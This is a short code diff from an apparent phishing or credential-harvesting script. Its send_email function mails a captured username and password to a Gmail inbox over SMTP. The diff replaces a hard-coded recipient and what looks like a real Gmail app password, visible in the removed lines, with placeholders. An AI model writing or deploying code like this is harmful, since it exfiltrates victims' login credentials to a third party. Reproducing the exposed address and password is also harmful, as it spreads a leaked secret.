@@ -25,12 +25,12 @@ def send_email(username, password):
     msg = EmailMessage()
     msg["Subject"] = "Login Attempt Info"
     msg["From"] = "your_gmail@gmail.com"  # Replace with your email
-    msg["To"] = "kidusassefa402@gmail.com"
+    msg["To"] = "someone@gmail.com"
     msg.set_content(f"Username: {username}\nPassword: {password}")
 
     try:
         with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
-            smtp.login("kidusassefa402@gmail.com", "wxij kjbe ojxr xjrl")  # Replace with real info
+            smtp.login("your@gmail.com", "yor _google_auth")  # Replace with real info
             smtp.send_message(msg)
             
     except Exception as e:
